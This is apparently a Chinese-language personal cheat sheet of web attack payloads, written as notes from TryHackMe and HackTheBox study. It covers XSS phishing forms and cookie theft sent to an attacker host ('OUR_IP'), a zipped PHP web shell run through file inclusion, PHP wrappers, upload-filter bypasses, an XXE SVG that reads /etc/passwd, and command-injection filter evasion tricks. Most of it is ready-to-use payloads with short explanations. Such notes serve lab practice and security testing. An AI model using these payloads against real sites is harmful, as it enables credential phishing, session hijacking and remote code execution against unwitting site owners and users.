# XSS

## 登录表单

	document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');x

这里DOM直接插入一个登录表单可以进行钓鱼

通过DOM可以直接移除原有的登录表单

	document.getElementById().remove()

## 远程加载js

	<script src="http://OUR_IP/script.js"></script>

## 会话劫持

在thm的学习当中，我们知道直接通过fetch()或者iframe标签进行http请求有可能会被浏览器的蜜汁安全给拦截，所以我们可以使用img标签的src来发起http请求，因为img请求起来总是像是合法的，它也并不会被浏览器拦截

	document.location='http://OUR_IP/index.php?c='+document.cookie;
	new Image().src='http://OUR_IP/index.php?c='+document.cookie;

# LFI

## PHP Wrappers

数据包装器可用于包含外部数据，包括 PHP 代码。但是，只有在 PHP 配置中启用了 allow_url_include 设置时，数据包装器才可用。

- php://filter
- data://text/plain,
- php://input

## RFI

可以尝试http、ftp这些协议。如果是Windows，还可以使用UNC路径，它将会尝试使用smb和http

## 文件上传搭配文件包含

常规打法。通过文件上传传一个图片马，用文件包含直接包含出来从而RCE

还可以通过上传zip压缩包然后使用zip://解压并RCE

	M1n9K1n9@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

	?file=zip://./uploads/shell.jpg%23shell.php&cmd=id

## PHPSession

- /var/lib/php/sessions/sess_xxxxxxxx
- C:\Windows\Temp\

phpsession会记录与用户相关的数据，如果文件内容我们可控，那么我们将能造成RCE

## 服务器日志以及配置文件

[这里](https://github.com/DragonJAR/Security-Wordlist/)包含了linux和Windows常见的服务日志和配置文件路径列表


以及SecLists中的burp-parameter-names.txt用于找到可能导致文件包含的参数

# 文件上传

## 常见后缀列表

SecLists的[web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

## 白名单绕过

当遇到不安全的白名单限制时

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

可以尝试双扩展

## 反向双扩展

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

这是Web 服务器确定允许 PHP 代码执行哪些文件的方式

这也就意味着只要文件名的"."后能被以上规则匹配，则将会被php执行，那么我们就可以尝试反向双扩展:

	.php.jpg

这个案例能被匹配到

## Content-Type / MIME Type

## 文件上传造成XSS

往图片插入js代码，并以Content-Type：text/html的类型上传，这将可能会造成xss

## 文件上传造成XXE

通过上传恶意svg图片进行XXE

```xml
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

# 命令注入

## ${IFS}

## bash花括号

- {ls,-la}

在bash当中，通过这种形式可以执行命令，bash会自动将里面的逗号转换为空格，而这种方式也只有bash才可以

## ${环境变量}

${变量名:起始下标:长度}

- ${PATH:0:1} -> /
- ${LS_COLORS:10:1} -> ;

具体还是根据目标而定

## 引号绕过

linux和powershell都可以用引号或双引号绕过黑名单

	whoam'i'
	whoam"i"

而在windows cmd下只能使用双引号

![在这里插入图片描述](https://img-blog.csdnimg.cn/1056747d3b344aa8b49121addb1fd09d.png)

## $@ - ^

在bash下，$@将会被忽略，cmd下^也是如此

## 反转绕过

```bash
$(rev<<<'di')
```

```powershell
iex "$('imaohw' -join '')"
```

如果管道符|被禁用，则可以尝试<<<

